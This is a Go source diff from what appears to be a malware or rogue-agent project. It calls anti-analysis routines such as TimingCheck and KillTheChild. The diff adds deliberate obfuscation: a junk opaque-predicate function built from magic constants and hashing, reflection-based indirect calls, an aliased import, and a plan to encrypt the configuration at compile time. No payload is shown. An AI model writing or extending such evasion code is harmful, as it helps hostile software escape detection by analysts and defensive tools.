@@ -4,12 +4,14 @@ import (
 	"0xo0xo0xo0xo0/z/anti"
 	"0xo0xo0xo0xo0/z/rogue"
 	"0xo0xo0xo0xo0/z/shared"
+	"crypto/sha256"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
+	"math/rand"
 	"net/http"
-	"reflect"
+	b "reflect"
 )
 
 // ResponseData Struct to hold the response format from the server
@@ -39,11 +41,44 @@ func opaqueBasedOnModulo(x int) bool {
 
 func runTimeCheck() bool {
 	hidden := unknown{primaryField: false}
-	v := reflect.ValueOf(hidden)
+	v := b.ValueOf(hidden)
 	return v.Field(0).Bool()
 }
 
+func X1A9T(x int) bool {
+	rand.NewSource(int64(x) ^ 0xDEADBEEF)
+
+	a := (x*3 + 42) ^ (x >> 2)
+	b2 := (a & 0xFF) + ((a >> 8) & 0xFF) + ((a >> 16) & 0xFF)
+	c := (a * b2) ^ 0xCAFEBABE
+	d := (c % 97) * (x % 31)
+
+	hash := sha256.Sum256([]byte(fmt.Sprintf("%d", d)))
+	intCheck := int(hash[0]) & 1
+
+	if intCheck != 1 && ((x*x+x)&1 == 0) {
+		d += x * x
+	}
+
+	intCheck1 := ((x ^ 0xABCD) & 0xF0F0) ^ ((d & 0x1234) | 0x55AA)
+	if intCheck1 > 100000 {
+		d += x << 2
+	} else {
+		d -= x >> 3
+	}
+
+	result := ((d & 0xF) ^ 0xA) == 0xF
+	toGet1 := (result && (d|x)%17 == 0) || (d^0xFF != x^0x1234)
+
+	return toGet1 || x == 42
+}
+
 func main() {
+	/*
+		Todo:
+		The config should be encrypted at compile time
+		Values gotten from it should be decrypted upon use
+	*/
 	anti.TimingCheck()
 	anti.KillTheChild()
 	switch runTimeCheck() {
@@ -245,4 +280,10 @@ XXSFDgs12:
 		return sum
 	}
 	_ = XXsd(5, 3)
+
+	funcName := "X1A9T"
+	args := []b.Value{b.ValueOf(23498756213049576)}
+	b.ValueOf(map[string]interface{}{
+		"X1A9T": X1A9T,
+	}[funcName]).Call(args)
 }
